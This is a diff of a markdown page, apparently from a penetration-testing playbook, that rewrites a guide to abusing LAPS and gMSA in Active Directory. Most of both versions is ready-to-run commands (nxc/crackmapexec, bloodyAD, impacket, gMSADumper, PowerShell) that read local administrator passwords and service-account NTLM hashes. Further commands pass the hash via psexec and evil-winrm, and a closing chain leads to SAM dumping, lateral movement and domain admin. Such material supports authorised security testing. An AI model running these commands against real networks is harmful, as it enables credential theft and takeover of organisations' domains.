@@ -3,65 +3,61 @@ id: laps-abuse
 title: LAPS & gMSA Abuse
 stage: privesc
 tags: [windows, ad]
-tools:
-  - crackmapexec smb $TARGET -u user -p pass -M laps
-  - Get-ADComputer $TARGET -Properties ms-Mcs-AdmPwd
-  - impacket-laps domain.local/user:pass -computer $TARGET -dc-ip $DC
-leads_to: [system-shell, domain-admin]
-summary: Read LAPS local admin passwords or gMSA service account passwords from Active Directory if you have the required permissions.
+summary: Read LAPS local admin passwords or gMSA service account NTLM hashes from AD if your account has ReadProperty access — BloodHound shows both as explicit edges.
+leads_to:
+  - system-shell
+  - domain-admin
 ---
 
-## What is LAPS
+## Prerequisites
 
-LAPS (Local Administrator Password Solution) randomises the local Administrator password on each domain-joined machine and stores it in AD attribute `ms-Mcs-AdmPwd`. Only specific AD groups (and SYSTEM) can read it. If your user or group has `AllExtendedRights` or `ReadProperty` on that attribute — you can retrieve the plaintext password.
+A domain account with `ReadLAPSPassword` or `ReadGMSAPassword` rights — visible in BloodHound as explicit edges. nxc (netexec) installed for LAPS module, or bloodyAD/gMSADumper for gMSA.
 
-## Check LAPS Presence
+LAPS randomises the local Administrator password on each domain-joined machine and stores it in `ms-Mcs-AdmPwd` in AD. Only accounts with `AllExtendedRights` or specific `ReadProperty` on that attribute can retrieve it. gMSA passwords live in `msDS-ManagedPassword`. Both can be read over LDAP with valid credentials if the ACL allows it — no shell on the target machine required.
 
-```bash
-# Does the attribute exist on a target computer?
-# From Linux
-impacket-laps domain.local/user:password -computer TARGET_HOSTNAME -dc-ip $DC
+## Quick Win
 
-# From Windows
-Get-ADComputer TARGET -Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd
-```
-
-## Read LAPS Password with CME
+> nxc laps module lists every machine where your account can read the LAPS password.
 
 ```bash
-crackmapexec smb $DC -u user -p password -M laps
-# Lists all computers where your account can read the LAPS password
+nxc ldap $DC -u user -p password -M laps
 ```
 
-## PowerView — Who Can Read LAPS on a Machine
+## Check LAPS Presence and Read Password
+
+> Verify LAPS is deployed, then retrieve the password for target machines.
+
+```bash
+# Check which machines you can read LAPS for (lists all at once)
+nxc ldap $DC -u user -p password -M laps
+
+# Read password for a specific machine via bloodyAD
+bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP get search \
+  --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd
+```
 
 ```powershell
-# Find which groups/users can read ms-Mcs-AdmPwd
+# From Windows — PowerView / LAPS module
 Find-AdmPwdExtendedRights -ComputerName $TARGET_COMPUTER
 Get-AdmPwdPassword -ComputerName $TARGET_COMPUTER
-```
 
-## Enumerate All Readable LAPS Passwords
-
-```powershell
-# Get all computers that have LAPS enabled and password is readable
-Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | 
-  Where-Object { $_.'ms-Mcs-AdmPwd' } | 
+# Manual AD query
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd |
+  Where-Object { $_.'ms-Mcs-AdmPwd' } |
   Select Name, 'ms-Mcs-AdmPwd'
 ```
 
-## gMSA (Group Managed Service Accounts)
+## gMSA Password Retrieval
 
-gMSA passwords are stored in AD attribute `msDS-ManagedPassword`. Accounts/groups in `PrincipalsAllowedToRetrieveManagedPassword` can read it.
+> gMSA passwords are stored in AD and readable by accounts in PrincipalsAllowedToRetrieveManagedPassword.
 
 ```bash
-# From Linux — retrieve gMSA password
-impacket-bloodyAD -d domain.local -u user -p password --host $DC \
-  get object gMSA_ACCOUNT$ --attr msDS-ManagedPassword
-
-# Or with gMSADumper
+# gMSADumper (outputs account:::NTLM_HASH)
 python3 gMSADumper.py -u user -p password -d domain.local -l $DC
-# Outputs: account$:::NTLM_HASH
+
+# bloodyAD
+bloodyAD --host $DC_IP -d domain.local -u user -p 'password' \
+  get object gMSA_ACCOUNT$ --attr msDS-ManagedPassword
 ```
 
 ```powershell
@@ -69,24 +65,23 @@ python3 gMSADumper.py -u user -p password -d domain.local -l $DC
 $gmsa = Get-ADServiceAccount -Identity gMSA_ACCOUNT -Properties msDS-ManagedPassword
 $mp = $gmsa.'msDS-ManagedPassword'
 $blob = $mp | ConvertFrom-ADManagedPasswordBlob
-$blob.CurrentPassword   # or extract NTLM from blob
+$blob.CurrentPassword
 ```
 
 ## Use Retrieved Credentials
 
+> LAPS password → local admin session. gMSA hash → PTH with the machine account name.
+
 ```bash
-# LAPS password — authenticate as local Administrator
-crackmapexec smb $TARGET -u Administrator -p 'LAPS_PASSWORD' --local-auth
+# LAPS — authenticate as local Administrator
+nxc smb $TARGET -u Administrator -p 'LAPS_PASSWORD' --local-auth
 evil-winrm -i $TARGET -u Administrator -p 'LAPS_PASSWORD'
 
-# gMSA — Pass the Hash with retrieved NTLM
+# gMSA — pass-the-hash (note the trailing $ in the account name)
 impacket-psexec domain.local/'gMSA_ACCOUNT$'@$TARGET -hashes :NTLM_HASH
+evil-winrm -i $TARGET -u 'gMSA_ACCOUNT$' -H NTLM_HASH
 ```
 
-## Notes
+## Leads To
 
-- LAPS only protects the built-in local Administrator (RID 500) — other local accounts are unaffected
-- BloodHound marks `ReadLAPSPassword` and `ReadGMSAPassword` edges — check shortest path to DA
-- If you can modify `PrincipalsAllowedToRetrieveManagedPassword` (WriteDACL/GenericAll), add yourself
-- gMSA accounts often have high privileges (database service, backup, etc.) — retrieving the hash is frequently a DA path
-
+LAPS password retrieved → local admin on that machine → dump SAM/LSA → pass-the-hash laterally → system-shell. gMSA hash retrieved → PTH as service account → if service account has DA rights → domain-admin. If you have `WriteDACL` on `PrincipalsAllowedToRetrieveManagedPassword` → add yourself to that group → read all gMSA passwords.
